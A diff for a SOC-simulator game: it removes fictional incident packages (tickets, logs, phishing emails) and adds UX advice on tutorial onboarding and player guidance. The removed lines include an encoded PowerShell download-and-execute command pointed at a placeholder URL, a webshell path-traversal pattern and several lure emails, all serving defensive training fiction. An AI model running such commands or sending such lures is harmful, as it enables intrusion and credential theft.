@@ -1,203 +1,105 @@
-Here are 5 high-fidelity Incident Packages designed for direct implementation into your Godot 4.4 SOC Simulator.
+This is a fantastic project concept, and the technical infrastructure you've built (Signal-based, decoupled `TutorialManager`, `FocusOverlay`, etc.) is the perfect foundation for a polished and immersive onboarding experience. The challenge now is to layer the *experience design* on top of that solid architecture.
 
-These packages are structured to introduce complex decision-making (like the trade-off between quarantine and forensics) and align with the escalating tension of your "Week 3: Corporate Espionage" and "Week 4: Zero-Day Apocalypse" narrative arcs.
-
----
-
-### Week 3: Corporate Espionage
-*Theme: A shadowy competitor is using targeted, low-and-slow techniques to steal sensitive intellectual property.*
+Here are best practices and creative UX solutions tailored for "VERIFY.EXE."
 
 ---
 
-#### Incident Package #3-01: "The Silent Credential Harvest"
-- **Concept:** A spear-phishing email with impeccable authentication tricks the victim into entering Office 365 credentials on a lookalike portal.
+### A. Onboarding Flow: Bridging the 3D/2D Gap
 
-##### A. The Ticket (TicketResource)
-- **Ticket ID:** ESP-023
-- **Title:** Potential Credential Phishing targeting {victim}
-- **Description:** User {victim} reported a password reset notification, despite not requesting one. An email was received from a domain impersonating our SSO provider. The user admits to clicking the link and attempting to log in.
-- **Severity:** High
-- **Category:** Phishing
-- **Analysis Steps:**
-    1.  Analyze Email Headers for domain impersonation techniques.
-    2.  Correlate {victim}’s geolocation login attempts in Office365 logs.
-    3.  Check for any suspicious mailbox forwarding rules created by {victim}.
-- **Required Tool:** email
-- **Required Log IDs:** LOG-O365-001, LOG-SYS-089
+The core challenge is the transition from the physical space (body) to the digital space (mind). Abruptly shifting control schemes or visual languages will break immersion.
 
-##### B. The Evidence Log (LogResource)
-- **Log ID:** LOG-O365-001
-- **Source:** Office365
-- **Message:** Impossible travel detected for user {victim}. Successful login from legitimate IP (192.168.1.45) at 09:02:00 and simultaneous login from {ip} (Mountain View, CA) at 09:03:15.
-- **Severity:** 4
+**Best Practice: The "Guided Immersion" Approach**
 
-- **Log ID:** LOG-SYS-089
-- **Source:** SysMon
-- **Message:** Process Creation (Rule: PowerShell). User: {victim}. CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AewBtAGEAbABpAGMAaQBvAHUAcwBfdXJsfQAnACkA
-- **Severity:** 5
+The onboarding should feel like the player's first day on the job, with the CISO acting as their remote supervisor. The tutorial HUD should be 100% diegetic, existing within the game world to preserve the high-fidelity simulation feel.
 
-##### C. The Email (EmailResource)
-- **Subject:** Action Required: Outstanding Password Reset Request
-- **Body:** `Dear {victim}, Our automated system detected a failed login attempt on your account. To maintain compliance, you must verify your credentials immediately. <a href="http://{malicious_url}/sso-login">Click here to confirm</a>. Failure to do so will result in mailbox suspension.`
-- **Headers:**
-    - **SPF:** PASS
-    - **DKIM:** PASS
-    - **DMARC:** PASS (Compromised legitimate vendor account used to send this email)
-- **Hidden Risk:** `compromised_vendor_account` (If the player quarantines the email but fails to check for the backdoor PowerShell beacon established via a second-stage payload, the attacker retains access).
+**Actionable Design Pattern: The "Desk Pop" Tutorial**
+
+1.  **The First Objective (Physical):** The game starts with the player standing in the office. The 3D `TutorialWaypoint` appears on their assigned desk chair. The CISO (via Comms) says, *"Agent, have a seat. Your station is ready."*
+    - **Interaction:** Player walks to the chair. A "Press E to Sit" prompt appears, but it's a subtle, low-opacity world-space UI near the chair, not a massive screen-center overlay.
+2.  **The Transition (Physical -> Digital):** Upon sitting, the camera smoothly transitions to the workstation view. The player is now looking at their monitors. The mouse unlocks from looking around and instead becomes a cursor on the screen.
+3.  **The Second Objective (Digital):** The `FocusOverlay` shader activates, dimming the peripheral monitors and the 3D room. A sharp, glowing highlight appears on the "Email Client" icon on the main monitor's taskbar.
+    - **CISO:** *"We've got a new ticket in the queue. Open your mail client to review the initial report."*
+    - **Interaction:** The player clicks the icon. This is their first action in the 2D space. The `EventBus` fires `APP_OPENED` with the argument `email`, advancing the tutorial.
+
+**Why this works:** It uses the 3D space for gross motor skills (navigation) and the 2D space for fine motor skills (UI interaction). The CISO's dialogue provides the narrative glue, and the FocusOverlay provides the visual cue, all without a single "meta" tutorial pop-up.
 
 ---
 
-#### Incident Package #3-02: "The Data Hoarder"
-- **Concept:** An insider, possibly paid by a competitor, is manually exfiltrating design documents to a personal cloud storage account.
+### B. Instructional Style: Corporate SOP vs. Meta UI
 
-##### A. The Ticket (TicketResource)
-- **Ticket ID:** DLP-045
-- **Title:** Unusual Outbound Data Transfer from Engineering
-- **Description:** DLP alert triggered by a workstation in the high-security engineering subnet. Over 5GB of proprietary design files were zipped and uploaded to an external cloud storage provider not sanctioned by IT.
-- **Severity:** Critical
-- **Category:** Insider Threat
-- **Analysis Steps:**
-    1.  Verify the source host and user identity against badge access logs.
-    2.  Use the terminal to capture a memory snapshot of the process performing the upload.
-    3.  Identify the destination IP and domain reputation.
-- **Required Tool:** terminal
-- **Required Log IDs:** LOG-FW-882, LOG-DLP-101
+Given the "Corporate/High-Tech" tone, any instruction that feels like a generic video game tutorial ("Press X to win") will immediately shatter the illusion.
 
-##### B. The Evidence Log (LogResource)
-- **Log ID:** LOG-FW-882
-- **Source:** Firewall (Next-Gen)
-- **Message:** Connection Burst: {host} to {ip}:443 (Unknown Cloud Provider). 4.7GB Transferred. Application: Web Browsing (TLS). User: {victim}.
-- **Severity:** 3
+**Best Practice: 100% Diegetic Instruction**
 
-- **Log ID:** LOG-DLP-101
-- **Source:** Endpoint DLP
-- **Message:** Data Loss Prevention match: File `project_zeus_schematics_v3.zip` containing classification "PROPRIETARY & CONFIDENTIAL" uploaded to web drive {malicious_url}.
-- **Severity:** 5
+Instructions should be framed as Standard Operating Procedures (SOPs), directives from the CISO, or tooltips within the operating system itself.
 
-##### C. The Email (EmailResource)
-- **Subject:** FW: Personal Cloud Storage Access
-- **Body:** `{victim}, As per your request, access to personal cloud drives has been temporarily enabled for the next 2 hours for business continuity. Please ensure no PHI or PII is uploaded. – IT Support`
-- **Headers:**
-    - **SPF:** PASS
-    - **DKIM:** FAIL (Spoofed internal IT department)
-    - **DMARC:** FAIL
-- **Hidden Risk:** `missed_lateral_movement` (If the player isolates the host immediately without scanning the process memory, they miss the fact that the user is currently on the phone with the attacker, feeding them the files manually).
+- **Diegetic "Press E to sit":** Instead of a grey box, have a small, backlit sticker on the edge of the desk that reads: **"WORKSTATION - ACTIVATE"** with a subtle `[E]` next to it. Or, have the CISO say, *"Go ahead, activate your terminal."* while a subtle pulse highlights the chair.
+- **Diegetic "Click the SIEM icon":** The `FocusOverlay` highlight is the primary cue. The CISO can add context: *"Pull up the SIEM. I need you to correlate the log source from that phishing email."*
+- **Diegetic "Command Syntax":** The in-game `Terminal` app itself is the best teacher.
+    - **Bad (Meta):** A pop-up says "Type `scan_host 192.168.1.45`".
+    - **Good (Diegetic):** The player opens the Ticket. In the ticket details, an "Attached Notes" section contains a message from a senior analyst: *"Initial triage suggests host 192.168.1.45 is beaconing. Use the `scan_host` utility to confirm."* The player must read the ticket, extract the IP and the command, and type it themselves.
+
+**Key Takeaway:** The game's UI should be the player's *portal* to the world, not the *instructor* for it. All teaching should be filtered through the lens of the job itself.
 
 ---
 
-### Week 4: Zero-Day Apocalypse
-*Theme: A widespread, unknown vulnerability is being exploited in the wild, causing chaos across the infrastructure.*
+### C. Handling Failure during Training: "After-Action Review" not "Game Over"
+
+In a professional simulator, failure is a learning opportunity, not a dead end. The game should simulate the consequences and the correction, not the frustration of a "Mission Failed" screen.
+
+**Best Practice: The "CISO Correction" Loop**
+
+If the player isolates the wrong host, don't stop the game. Instead, simulate the workflow of a mistake in a SOC.
+
+1.  **Immediate Consequence (Simulated):** The CISO's comms activate, but with a tone of concern, not reprimand. *"Hold on, Agent. I'm seeing the isolation alert, but the telemetry from host 192.168.1.67 doesn't match the beaconing pattern. Re-check your ticket. Did we have the right IP?"*
+2.  **Visual Cue:** The Ticket UI could have a subtle, non-intrusive red pulsing border, or a small "Discrepancy Detected" flag appears on the ticket.
+3.  **Guided Correction:** The `FocusOverlay` could gently highlight the "Ticket Details" panel again, specifically the IP address field. The CISO then gives a nudge: *"Cross-reference the source IP in the email headers with the ticket. Let's make sure we have the right target."*
+4.  **The Fix:** The player re-opens the email, checks the headers (a core gameplay loop), realizes their mistake, and runs the correct `isolate` command on the proper host.
+5.  **Positive Reinforcement:** Upon successful isolation, the CISO acknowledges the recovery: *"Good catch. Always verify the source. That's how we stay sharp. Isolation confirmed on the correct host. Well done."*
+
+**Why this works:** It treats the player like a new hire who made a common, understandable mistake. The failure state is a narrative beat that reinforces the game's core theme ("Verify") and teaches a valuable lesson about attention to detail, all without breaking the simulation.
 
 ---
 
-#### Incident Package #4-01: "The Auth Bypass Ghost"
-- **Concept:** Attackers are exploiting a zero-day in a widely used network device to bypass authentication and establish persistent C2 channels.
+### D. Visual Language: "System Guidance" over "Hand-holding"
 
-##### A. The Ticket (TicketResource)
-- **Ticket ID:** ZERO-001
-- **Title:** Critical Auth Bypass on Perimeter Edge Device
-- **Description:** Emerging Threat Intel reports active exploitation of CVE-2024-ZZZZ affecting our VPN concentrator model. Anomalous traffic from {host} suggests a webshell has been uploaded.
-- **Severity:** Critical
-- **Category:** Unauthorized Access
-- **Analysis Steps:**
-    1.  Verify device integrity by checking for unauthorized configuration changes.
-    2.  Use SIEM to find beaconing traffic from {host} to known C2 infrastructure.
-    3.  Cross-reference access logs to see if legitimate credentials were used.
-- **Required Tool:** siem
-- **Required Log IDs:** LOG-IDS-404, LOG-CONF-999
+The `FocusOverlay` shader is a powerful tool. The key is to use it with the precision and intent of a professional tool, not like a children's storybook.
 
-##### B. The Evidence Log (LogResource)
-- **Log ID:** LOG-IDS-404
-- **Source:** IDS/IPS
-- **Message:** SURICATA: ET WEB_SERVER Possible CVE-2024-ZZZZ Webshell Access on {host} - URI Pattern `/cgi-bin/.%2e/.%2e/.%2e/bin/sh` matched. Source: {ip}.
-- **Severity:** 5
+**Best Practice: The "Augmented Reality" Style**
 
-- **Log ID:** LOG-CONF-999
-- **Source:** Configuration Management
-- **Message:** Device Config Change: {host}. New SSH User "service-acct" added with UID 0 privileges. No change ticket associated. Time of change matches IDS alert.
-- **Severity:** 5
+Treat the FocusOverlay not as a "tutorial arrow," but as an analytical overlay that the CISO can project onto your screen.
 
-##### C. The Email (EmailResource)
-- **Subject:** URGENT PATCH: VPN Concentrator Maintenance
-- **Body:** `Admins, A critical patch for your VPN device is available for immediate deployment. Download and apply using your admin credentials here: http://{malicious_url}/firmware-update Please complete within the hour to prevent a breach. – NOC Leadership`
-- **Headers:**
-    - **SPF:** PASS
-    - **DKIM:** PASS
-    - **DMARC:** PASS (Attacker compromised the NOC mailing list)
-- **Hidden Risk:** `config_lockout` (If the player attempts to connect to the device using the terminal to "isolate" it, the attacker's modified config locks them out, triggering a full outage before they can stop the exfiltration).
+- **Hierarchy of Attention:**
+    - **Primary Action (Active Task):** The target element is sharp, at 100% brightness, and has a clean, 1-pixel-thick **animated dashed outline** in a corporate blue or amber color. The animation is subtle, like a slowly rotating dash pattern. This signals "this is the active element in your workflow."
+    - **Contextual Zone (Passive Task):** The rest of the *specific application* the player needs to use is at 80% brightness, not fully dimmed. This tells the player, "Stay in this app."
+    - **Background:** The other monitors and the 3D environment are dimmed to 30-40% with the shader, becoming completely out of focus.
+
+- **The "Look At" Cue:** Instead of a bouncing 3D waypoint in the 2D space (which would be noisy), use a subtle screen-space indicator. A small, thin line could trace a path from the center of the screen to the target button, like a faint "ping" from the CISO's guidance system. It draws the eye without obscuring the UI.
+
+- **Color Logic:** Establish a strict color code.
+    - **Amber / Yellow:** "Investigate Here" / "Pending Action."
+    - **Cyan / Blue:** "System Confirmation" / "Selected Element."
+    - **Green:** "Success" / "Secure."
+    - **Red:** "Threat Detected" / "Urgent Mismatch" (used sparingly, even in tutorials, for critical errors like the wrong host isolation attempt).
+
+This approach feels like a professional tool is helping you navigate complex data, which is perfectly on-theme for a SOC simulator.
 
 ---
 
-#### Incident Package #4-02: "Process Ghosting Payload"
-- **Concept:** A zero-day evasion technique (Process Ghosting) is used to deploy ransomware, bypassing traditional EDR.
+### E. Scaffolding: Combating "Dashboard Fatigue"
 
-##### A. The Ticket (TicketResource)
-- **Ticket ID:** RANSOM-007
-- **Title:** Rapid File Encryption Alerts on Marketing Share
-- **Description:** Multiple users reporting files opening with a `.encrypted` extension. EDR shows a known good process (`svchost.exe`) with anomalous network behavior originating from {host}.
-- **Severity:** Critical
-- **Category:** Ransomware
-- **Analysis Steps:**
-    1.  Use terminal to identify the parent process of the malicious `svchost.exe`.
-    2.  Isolate the host immediately to prevent encryption of network shares.
-    3.  Analyze outbound connections to find the ransomware operator's C2.
-- **Required Tool:** terminal
-- **Required Log IDs:** LOG-SYS-666, LOG-PROC-777
+Presenting five apps at once is overwhelming. You need to scaffold the player's cognitive load by introducing them as part of a logical narrative flow, not a "Here are your tools" menu.
 
-##### B. The Evidence Log (LogResource)
-- **Log ID:** LOG-SYS-666
-- **Source:** SysMon (Process Access)
-- **Message:** Process accessed handle to `lsass.exe` from `svchost.exe` (PID: 1337) with suspicious access rights (0x1410). Source Path: `C:\Windows\Temp\~tmpDF9.tmp`.
-- **Severity:** 4
+**Best Practice: The "Investigation Narrative" Scaffold**
 
-- **Log ID:** LOG-PROC-777
-- **Source:** EDR
-- **Message:** Process Ghosting technique detected. Process `svchost.exe` (PID: 1337) is running from a deleted image on disk. Network connections established to {ip}:8443.
-- **Severity:** 5
+Introduce each application at the precise moment it becomes relevant to the story of the investigation.
 
-##### C. The Email (EmailResource)
-- **Subject:** Important: Updated Holiday Schedule
-- **Body:** `Hi {victim}, Please review the updated holiday schedule for the Q3 closure. The document is password-protected for your safety. Password is "1234". Download here: [Link to {malicious_url}/schedule.doc]`
-- **Headers:**
-    - **SPF:** FAIL
-    - **DKIM:** FAIL
-    - **DMARC:** FAIL (Generic domain impersonation)
-- **Hidden Risk:** `ransomware_spread` (If the player only scans the link and deletes the email, but doesn't isolate {host} in time, the ransomware continues to encrypt the network drives).
+1.  **Act 1: Triage (The Ticket & Email):** The game starts with the Ticket Queue and Email client. That's it. The CISO explains the ticket system and the player's first job is to open an email and read the report. The SIEM, Map, and Terminal icons are visible but greyed out or unclickable, with a tooltip that says "Access pending authorization."
 
----
+2.  **Act 2: Analysis (The SIEM):** The player has read the email. The CISO says, *"The email headers show a source IP. Let's see if our SIEM has any correlated logs for that address."* At this exact moment, the SIEM icon becomes active, perhaps with a subtle glow, and the `FocusOverlay` guides them to it. They click it, and the app opens with the relevant query (the suspicious IP) pre-populated.
 
-#### Incident Package #4-03: "The Dependency Confusion"
-- **Concept:** A zero-day supply chain attack where a malicious package is uploaded to a public repository, and an internal build server pulls it instead of the private one.
+3.  **Act 3: Verification (The Terminal):** The SIEM logs confirm the host is compromised. The CISO: *"Confirmed. That host is beaconing to a known C2. We need to scan it. Open the Terminal."* The Terminal icon activates. The first time they open it, a log file (or a sticky note on the monitor) might contain the exact command syntax they need, teaching them the tool in a low-stakes way.
 
-##### A. The Ticket (TicketResource)
-- **Ticket ID:** DEV-INF-88
-- **Title:** Build Pipeline Compromise - Cryptominer Deployed
-- **Description:** DevOps reports a sudden spike in CPU usage on build servers. A new process named "java.exe" is running from a temp directory. Review of logs shows a new package `internal-logger` was fetched from the public NPM registry, not our private one.
-- **Severity:** High
-- **Category:** Malware
-- **Analysis Steps:**
-    1.  Verify the hash of the downloaded package against the legitimate internal version.
-    2.  Trace the outbound connections from the build server {host} to the miner's C2 pool.
-    3.  Check the package registry for the domain of the malicious uploader.
-- **Required Tool:** siem
-- **Required Log IDs:** LOG-DEV-123, LOG-NPM-456
+4.  **Act 4: Action (The Map & Isolation):** The scan confirms the threat. The CISO: *"Alright, we've verified. It's a go for isolation. Bring up the network map to locate the switch port."* The Map activates. After locating it, the final `isolate` command is run, and the ticket is closed.
 
-##### B. The Evidence Log (LogResource)
-- **Log ID:** LOG-DEV-123
-- **Source:** Build Server Logs
-- **Message:** Build Job #1142 for project `authentication-api`. Dependency resolved: `internal-logger` version `2.1.1` fetched from `https://registry.npmjs.org/internal-logger`. Expected source: `http://internal-artifactory/repo`.
-- **Severity:** 4
-
-- **Log ID:** LOG-NPM-456
-- **Source:** Firewall (DNS Query)
-- **Message:** DNS Request from {host}: `update.nodejs.packages.top`. Resolves to {ip}. User-Agent: npm.
-- **Severity:** 3
-
-##### C. The Email (EmailResource)
-- **Subject:** [GitHub] Security Alert for your dependencies
-- **Body:** `Hello Developer, A vulnerability was found in one of your dependencies. Please merge this pull request to patch it immediately. <a href="http://{malicious_url}/fix-patch">Merge Request #42</a>.`
-- **Headers:**
-    - **SPF:** PASS
-    - **DKIM:** PASS
-    - **DMARC:** PASS (Attacker cloned the GitHub notification system and used a typosquatted domain)
-- **Hidden Risk:** `supply_chain_propagation` (If the player simply kills the miner process on {host} but doesn't purge the malicious package from the artifact repository, the next build will be instantly re-infected).
+**Why this works:** This is the "Kill Chain" you mentioned, turned into a learning path. Each app is introduced as a necessary tool to solve the current puzzle. The player never feels like they have to memorize a dashboard; instead, they learn a workflow. By the second or third ticket, they will be switching between all five apps fluidly because they understand the *purpose* of each one within the investigation narrative.
